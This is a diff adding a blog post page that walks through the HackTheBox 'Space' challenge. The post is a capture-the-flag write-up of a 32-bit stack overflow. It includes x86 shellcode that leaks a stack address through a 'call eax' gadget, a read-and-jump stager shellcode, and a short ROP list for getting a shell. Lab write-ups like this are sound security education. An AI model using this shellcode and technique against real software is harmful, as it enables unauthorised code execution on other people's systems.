@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Space | HackTheBox - Omer&#39;s Blog</title><meta name="Description" content="This my personal blog where I write about Tech"><meta property="og:title" content="Space | HackTheBox" />
+<meta property="og:description" content="Disclaimer This post is not meant to be an in depth tutorial, meaning it won&rsquo;t tell you each and every step you need to take to solve the challenge, rather it&rsquo;s meant to guide you, and give you a high level solution so you can solve the challenge in your own way.
+Intro The binary is simple in structure and straight forward, you have a space of 0x1f(31) to fill, with eip&rsquo;s offset being at 0x12(18)." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://omer-biz.github.io/posts/space-htb/" /><meta property="og:image" content="https://omer-biz.github.io/posts/space-htb/featured-image.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-11-09T20:29:58+03:00" />
+<meta property="article:modified_time" content="2022-11-09T20:29:58+03:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://omer-biz.github.io/posts/space-htb/featured-image.jpg"/>
+<meta name="twitter:title" content="Space | HackTheBox"/>
+<meta name="twitter:description" content="Disclaimer This post is not meant to be an in depth tutorial, meaning it won&rsquo;t tell you each and every step you need to take to solve the challenge, rather it&rsquo;s meant to guide you, and give you a high level solution so you can solve the challenge in your own way.
+Intro The binary is simple in structure and straight forward, you have a space of 0x1f(31) to fill, with eip&rsquo;s offset being at 0x12(18)."/>
+<meta name="application-name" content="Th3Librarin">
+<meta name="apple-mobile-web-app-title" content="Th3Librarin"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://omer-biz.github.io/posts/space-htb/" /><link rel="prev" href="https://omer-biz.github.io/posts/behemoth-2-overthewire/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Space | HackTheBox",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/omer-biz.github.io\/posts\/space-htb\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/omer-biz.github.io\/posts\/space-htb\/featured-image.jpg",
+                            "width":  2560 ,
+                            "height":  1440 
+                        }],"genre": "posts","keywords": "symlinks","wordcount":  571 ,
+        "url": "https:\/\/omer-biz.github.io\/posts\/space-htb\/","datePublished": "2022-11-09T20:29:58+03:00","dateModified": "2022-11-09T20:29:58+03:00","publisher": {
+            "@type": "Organization",
+            "name": "Omer"},"author": {
+                "@type": "Person",
+                "name": "Omer"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Omer&#39;s Blog">Th3Librarin</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/" title="Home Page"> Home </a><a class="menu-item" href="/posts/" title="Blog Posts"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about" title="About"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Omer&#39;s Blog">Th3Librarin</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Home Page">Home</a><a class="menu-item" href="/posts/" title="Blog Posts">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="About">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Space | HackTheBox</h1><h2 class="single-subtitle">Little space is all you need ;)</h2><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Omer</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-11-09">2022-11-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;571 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/space-htb/featured-image.jpg"
+        data-srcset="/posts/space-htb/featured-image.jpg, /posts/space-htb/featured-image.jpg 1.5x, /posts/space-htb/featured-image.jpg 2x"
+        data-sizes="auto"
+        alt="/posts/space-htb/featured-image.jpg"
+        title="/posts/space-htb/featured-image.jpg" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#disclaimer">Disclaimer</a></li>
+      </ul>
+    </li>
+    <li><a href="#intro">Intro</a></li>
+    <li><a href="#getting-a-leak">Getting a leak</a></li>
+    <li><a href="#getting-a-shell">Getting a shell</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h3 id="disclaimer">Disclaimer</h3>
+<p>This post is not meant to be an in depth tutorial, meaning it won&rsquo;t tell you
+each and every step you need to take to solve the challenge, rather it&rsquo;s meant
+to guide you, and give you a high level solution so you can solve the challenge
+in your <strong>own</strong> way.</p>
+<h2 id="intro">Intro</h2>
+<p>The binary is simple in structure and straight forward, you have a space of
+<code>0x1f(31)</code> to fill, with <code>eip</code>&rsquo;s offset being at <code>0x12(18)</code>.</p>
+<p>The hard part, though, comes when you want to exploit this vulnerability, unless
+you know how to prepare <code>0x12(18)</code> bytes of <code>execve</code> <code>shellcode</code> you pretty
+much have to attack this in multiple steps.</p>
+<h2 id="getting-a-leak">Getting a leak</h2>
+<p>Problem number one: <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="noopener noreffer">ASLR</a>
+. You just have to leak a stack address as everything
+is already there except for some <a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank" rel="noopener noreffer">gadgets</a>
+in the <code>.text</code> section, and thankfully
+the binary has disabled <a href="https://www.redhat.com/en/blog/position-independent-executables-pie" target="_blank" rel="noopener noreffer">PIE</a></p>
+<p>So, let&rsquo;s first defeat <code>ASLR</code>. If you make a break point on the <code>ret</code> instruction
+just before overwriting <code>eip</code>, with is at <code>0x080491ce</code>, and run the binary with <code>gdb</code> you will see that
+<code>eax</code> holds the address of our input string. This along with a
+<code>call eax</code> gadget can help us to run some shellcode, but keep in mind this
+the shellcode we are running can not be more than <code>0x12(18)</code> bytes in size. We
+will use this to leak the address on the stack.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">BITS</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">ebx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">inc</span> <span class="no">ebx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">dl</span><span class="p">,</span>  <span class="mi">0x38</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
+</span></span><span class="line"><span class="cl"><span class="nf">int</span> <span class="mi">0x80</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span><span class="line"><span class="cl"><span class="nf">db</span> <span class="err">&#34;</span><span class="no">A</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">dd</span> <span class="mi">0x08049019</span> <span class="c1">; call eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">dd</span> <span class="mi">0x080491cf</span> <span class="c1">; main
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>The first line tells the assembler to assemble in <code>32bit</code> mode. The second
+paragraph is just the equivalent of the following in assemble.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">esp</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The next three lines are padding, fixing up the stack. Remember that every
+time you <code>pop</code> from the stack you are increasing the <code>esp</code> register, and
+vice versa when your using the <code>push</code> instruction.</p>
+<p>The first line from the last paragraph is where our first <code>eip</code> will land, the
+fact that we are using the <code>call</code> instruction helps to push <code>main</code>&rsquo;s address
+onto the stack (because that&rsquo;s the <code>call</code> instruction does it push the next
+instruction&rsquo;s address to stack before jumping elsewhere) which means we can
+use the <code>ret</code> at the end of our shellcode to return to <code>main</code>.</p>
+<p>Oh, and don&rsquo;t forget to parse the output of the <code>write</code> <code>syscall</code>.</p>
+<h2 id="getting-a-shell">Getting a shell</h2>
+<p>The fact that we are calling main again doesn&rsquo;t make the space problem go away,
+it&rsquo;s still there, that&rsquo;s why we should now write another shellcode which will
+helps to write as much as we want to memory.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">BITS</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="no">ecx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="no">ecx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="nf">sub</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">ebx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">dl</span><span class="p">,</span> <span class="mi">25</span>
+</span></span><span class="line"><span class="cl"><span class="nf">int</span> <span class="mi">0x80</span>
+</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="no">ecx</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x08049019</span><span class="p">,</span> <span class="c1"># call eax</span>
+</span></span><span class="line"><span class="cl">    <span class="n">leak</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The first <code>pop</code> instruction gets rid of a junk value on the stack and the
+second <code>pop</code> instruction gets the leaked address which we put on the stack
+with our <a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank" rel="noopener noreffer">rop</a>
+chain. The shellcode is equivalent to.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">ecx</span> <span class="cm">/*leak*/</span><span class="p">,</span> <span class="mi">25</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">ecx</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And that&rsquo;s it you send in your shellcode, and boom you a shell.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./space.gif"
+        data-srcset="./space.gif, ./space.gif 1.5x, ./space.gif 2x"
+        data-sizes="auto"
+        alt="./space.gif"
+        title="demo" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-11-09</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://omer-biz.github.io/posts/space-htb/" data-title="Space | HackTheBox" data-via="@th3_librarian" data-hashtags="symlinks"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://omer-biz.github.io/posts/space-htb/" data-hashtag="symlinks"><i class="fab fa-facebook-square fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/symlinks/">symlinks</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/behemoth-2-overthewire/" class="prev" rel="prev" title="Behemoth 2 - OverTheWire"><i class="fas fa-angle-left fa-fw"></i>Behemoth 2 - OverTheWire</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.104.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Omer</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
